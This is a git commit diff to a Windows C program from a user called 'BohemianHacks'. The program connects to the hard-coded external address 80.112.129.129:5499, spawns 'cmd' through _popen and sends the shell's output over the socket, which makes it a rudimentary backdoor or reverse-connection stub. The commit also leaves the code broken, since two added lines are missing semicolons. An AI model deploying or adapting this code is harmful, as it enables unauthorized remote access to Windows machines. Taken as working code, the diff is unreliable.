3e7c1adb97c77fadce5a0a5509299e2bbd1cfc3c
BohemianHacks <jeff.blecha@gmail.com>
2013-12-30 04:26:51 -0600

    Update main.c

--- main.c
+++ main.c
@@ -17,55 +17,25 @@ if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
     if (LOBYTE(wsaData.wVersion) >= iReqWinsockVer)
     {
         hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (hSocket==INVALID_SOCKET){
-            
-        }
-        else{
-            
+        if (hSocket!=INVALID_SOCKET){
             
             sockAddr.sin_family = AF_INET;
-
             sockAddr.sin_port = htons(5499);
-
             sockAddr.sin_addr.S_un.S_addr = inet_addr("80.112.129.129");
             
-            if (connect(hSocket, (SOCKADDR*)(&sockAddr), sizeof(sockAddr))!=0){
-                
-            }else{
-                
+            if (connect(hSocket, (SOCKADDR*)(&sockAddr), sizeof(sockAddr))==0){
                 FILE* commText = _popen("cmd","r");
                 if (commText != NULL){
                     while(fgets(MSG, sizeof(MSG), commText) != NULL){
-                        
-                        if (send(hSocket, MSG, strlen(MSG), 0) == SOCKET_ERROR){
-                            
-                        }else{
-                            
-                        }
+                        send(hSocket, MSG, strlen(MSG), 0)
                     }
-                }else{
-                    
                 }
                 _pclose(commText);
             }
-            
             closesocket(hSocket);
         }
     }
-    else
-    {
-        
-    }
-
-    // Cleanup winsock
-    if (WSACleanup()!=0)
-    {
-        
-    }
-}
-else
-{
-    
+    WSACleanup()
 }
 return 0;
 }
